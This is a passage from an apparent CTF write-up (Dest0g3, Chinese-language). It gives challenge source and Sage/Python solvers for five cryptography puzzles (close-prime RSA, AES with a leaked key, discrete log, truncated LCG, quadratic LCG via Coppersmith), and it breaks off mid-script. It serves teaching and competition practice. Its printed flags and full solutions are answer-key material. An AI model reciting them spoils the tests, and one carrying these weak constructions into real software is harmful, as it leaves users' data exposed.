id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line"><span class="string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ 相近，常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">p = iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>AES-CBC解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLP求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = </span><br><span class="line">h = </span><br><span class="line">x = discrete_log(mod(h,p),mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">8</span>] == <span class="string">&quot;Dest0g3&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.b = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.a, self.b, self.m))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line">lcg.output()</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="built_in">ord</span>(flag[i]) ^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 3939333498</span></span><br><span class="line"><span class="string">b = 3662432446</span></span><br><span class="line"><span class="string">m = 2271373817</span></span><br><span class="line"><span class="string">state1 = 17362</span></span><br><span class="line"><span class="string">state2 = 20624</span></span><br><span class="line"><span class="string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>LCG，爆破求seed：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3939333498</span></span><br><span class="line">b = <span class="number">3662432446</span></span><br><span class="line">m = <span class="number">2271373817</span></span><br><span class="line">state1 = <span class="number">17362</span></span><br><span class="line">state2 = <span class="number">20624</span></span><br><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    s1 = (state1&lt;&lt;<span class="number">16</span>)+i</span><br><span class="line">    s2 = (a*s1+b) % m</span><br><span class="line">    <span class="keyword">if</span> s2&gt;&gt;<span class="number">16</span> == state2:</span><br><span class="line">        seed = ((s1-b)*inverse_mod(a,m))%m</span><br><span class="line">        <span class="built_in">print</span>(seed)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 1315807869</span></span><br><span class="line"><span class="comment"># 710396196</span></span><br><span class="line"><span class="comment"># 104984523</span></span><br></pre></td></tr></table></figure><p>三个结果分别代入求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line">seed = [<span class="number">1315807869</span>,<span class="number">710396196</span>,<span class="number">104984523</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> seed:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.a = <span class="number">3939333498</span></span><br><span class="line">            self.b = <span class="number">3662432446</span></span><br><span class="line">            self.m = <span class="number">2271373817</span></span><br><span class="line">            self.seed = k</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">            <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    lcg = LCG()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(c[i] ^^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span></span><br><span class="line"><span class="comment"># Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span></span><br><span class="line"><span class="comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Mr-Doctor"><a href="#Mr-Doctor" class="headerlink" title="Mr.Doctor"></a>Mr.Doctor</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()[<span class="number">8</span>:-<span class="number">1</span>]</span><br><span class="line">seed = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHA256</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof = []</span><br><span class="line">        self.sha = <span class="number">0</span></span><br><span class="line">        self.sha_flag = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // <span class="number">4</span>):</span><br><span class="line">            self.proof.append(flag[<span class="number">4</span> * i:<span class="number">4</span> + <span class="number">4</span> * i])</span><br><span class="line">            self.sha = sha256(self.proof[i]).hexdigest().encode()</span><br><span class="line">            self.sha_flag.append(bytes_to_long(self.sha))</span><br><span class="line">        <span class="keyword">return</span> self.sha_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RHODES_ELITE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Doctor = getPrime(<span class="number">64</span>)</span><br><span class="line">        self.Amiya = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Rosmontis = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Blaze = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.seed = seed</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Amiya = &quot;</span>, self.Amiya)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blaze = &quot;</span>, self.Blaze)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doctor = &quot;</span>, self.Doctor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sha = SHA256()</span><br><span class="line">sha_flag = sha.encryption()</span><br><span class="line">elite = RHODES_ELITE()</span><br><span class="line">elite.output()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ash = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SliverAsh = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line">W = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="number">3</span>) ^ (elite.<span class="built_in">next</span>() % <span class="number">100</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sha_flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(W))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Amiya =  956366446278</span></span><br><span class="line"><span class="string">Rosmontis =  1061992537343</span></span><br><span class="line"><span class="string">Blaze =  636205571590</span></span><br><span class="line"><span class="string">Doctor =  18068433704538283397</span></span><br><span class="line"><span class="string">Ash =  1097363493609113</span></span><br><span class="line"><span class="string">SliverAsh =  2051431344160327</span></span><br><span class="line"><span class="string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>二阶LCG + 4位一轮爆破，用二元Coppersmith方法求seed：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">        R = f.base_ring()</span><br><span class="line">        N = R.cardinality()</span><br><span class="line">        f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">        f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">        G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            base = N ^ (m - i) * f ^ i</span><br><span class="line">            <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">                g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">                G.append(g)</span><br><span class="line"></span><br><span class="line">        B, monomials = G.coefficient_matrix()</span><br><span class="line">        monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">        factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">        B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">        B = B.change_ring(QQ)</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">        H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">            H.append(h)</span><br><span class="line">            I = H.ideal()</span><br><span class="line">            <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">                H.pop()</span><br><span class="line">            <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">                roots = []</span><br><span class="line">                <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                    root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                    roots.append(root)</span><br><span class="line">                    <span class="keyword">return</span> roots</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">a = <span class="number">956366446278</span></span><br><span class="line">b = <span class="number">1061992537343</span></span><br><span class="line">c = <span class="number">636205571590</span></span><br><span class="line">p = <span class="number">18068433704538283397</span></span><br><span class="line">state1 = <span class="number">1097363493609113</span></span><br><span class="line">state2 = <span class="number">2051431344160327</span></span><br><span class="line">PR.&lt; s1_low, s2_low &gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) ^ <span class="number">2</span> + b * ((state1 &lt;&lt; <span class="number">12</span>) 